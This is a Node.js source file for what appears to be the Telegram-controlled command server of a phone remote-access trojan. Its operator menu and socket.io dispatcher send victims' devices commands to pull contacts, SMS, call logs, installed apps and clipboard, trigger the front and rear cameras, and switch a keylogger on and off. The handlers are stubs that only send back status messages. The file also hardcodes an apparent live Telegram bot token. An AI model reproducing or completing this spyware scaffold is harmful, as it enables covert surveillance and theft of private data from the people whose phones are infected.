// Required modules
const TelegramBot = require('node-telegram-bot-api');
const { Server } = require('socket.io');
const express = require('express');
const app = express();

// Set up server and socket.io
const server = app.listen(3000, () => {
  console.log('Server is running on port 3000');
});
const io = new Server(server);

// Telegram Bot Token
const token = '8507961561:AAFGiLtXzjIcR-j2IQuIDA55QZDQEYQFq_4';
const bot = new TelegramBot(token, { polling: true });

// In-memory storage for app data
let appData = new Map();

// Listen for Telegram messages
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;

  // Handle different commands
  if (text === "/start") {
    bot.sendMessage(chatId, "<b>Welcome to the Bot!</b>\nSelect an option from the menu.", {
      parse_mode: "HTML",
      reply_markup: {
        keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
        resize_keyboard: true
      }
    });
  } else if (text === "✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯") {
    // Handle device commands
    handleDevices(chatId);
  } else if (text === "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯") {
    bot.sendMessage(chatId, "<b>Select an action:</b>", {
      parse_mode: "HTML",
      reply_markup: {
        keyboard: [["✯ 𝚂𝙼𝚂 ✯", "✯ 𝙲𝚊𝚕𝚕𝚜 ✯"], ["✯ 𝙰𝚙𝚙𝚜 ✯", "✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯"], ["✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯", "✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯"], ["✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯"]],
        resize_keyboard: true
      }
    });
  } else {
    bot.sendMessage(chatId, "<b>Unknown command. Please try again.</b>", { parse_mode: "HTML" });
  }
});

// Handle device actions
function handleDevices(chatId) {
  bot.sendMessage(chatId, "<b>Select a device action:</b>", {
    parse_mode: "HTML",
    reply_markup: {
      keyboard: [["✯ 𝙻𝚒𝚜𝚝 𝚍𝚎𝚟𝚒𝚌𝚎𝚜 ✯"], ["✯ 𝙱𝚎𝚝𝚊 𝚝𝚎𝚜𝚝𝚒𝚗𝚐 ✯"]],
      resize_keyboard: true
    }
  });
}

// Listen for socket.io connections
io.on('connection', (socket) => {
  console.log('New client connected');

  // Handle incoming commands
  socket.on('command', (data) => {
    const { request, extras, target } = data;

    if (request === "contacts") {
      // Process contacts request
      handleContacts(target, extras);
    } else if (request === "all-sms") {
      // Process all SMS request
      handleAllSMS(target, extras);
    } else if (request === "calls") {
      // Process calls request
      handleCalls(target, extras);
    } else if (request === "apps") {
      // Process apps request
      handleApps(target, extras);
    } else if (request === "main-camera") {
      // Process main camera request
      handleMainCamera(target, extras);
    } else if (request === "selfie-camera") {
      // Process selfie camera request
      handleSelfieCamera(target, extras);
    } else if (request === "clipboard") {
      // Process clipboard request
      handleClipboard(target, extras);
    } else if (request === "keylogger-on") {
      // Process keylogger on request
      handleKeyloggerOn(target, extras);
    } else if (request === "keylogger-off") {
      // Process keylogger off request
      handleKeyloggerOff(target, extras);
    }
  });

  socket.on('disconnect', () => {
    console.log('Client disconnected');
  });
});

// Dummy handlers for requests
function handleContacts(target, extras) {
  // Emit contacts data back to client
  io.to(target).emit('response', { success: true, message: 'Contacts fetched', extras });
}

function handleAllSMS(target, extras) {
  // Emit all SMS data back to client
  io.to(target).emit('response', { success: true, message: 'All SMS fetched', extras });
}

function handleCalls(target, extras) {
  // Emit calls data back to client
  io.to(target).emit('response', { success: true, message: 'Calls fetched', extras });
}

function handleApps(target, extras) {
  // Emit apps data back to client
  io.to(target).emit('response', { success: true, message: 'Apps fetched', extras });
}

function handleMainCamera(target, extras) {
  // Emit main camera data back to client
  io.to(target).emit('response', { success: true, message: 'Main camera activated', extras });
}

function handleSelfieCamera(target, extras) {
  // Emit selfie camera data back to client
  io.to(target).emit('response', { success: true, message: 'Selfie camera activated', extras });
}

function handleClipboard(target, extras) {
  // Emit clipboard data back to client
  io.to(target).emit('response', { success: true, message: 'Clipboard accessed', extras });
}

function handleKeyloggerOn(target, extras) {
  // Emit keylogger on data back to client
  io.to(target).emit('response', { success: true, message: 'Keylogger activated', extras });
}

function handleKeyloggerOff(target, extras) {
  // Emit keylogger off data back to client
  io.to(target).emit('response', { success: true, message: 'Keylogger deactivated', extras });
}

// Middleware to handle app data
app.use((req, res, next) => {
  if (req.method === "DELETE") {
    const key = req.body.key;
    appData.delete(key);
  }
  next();
});
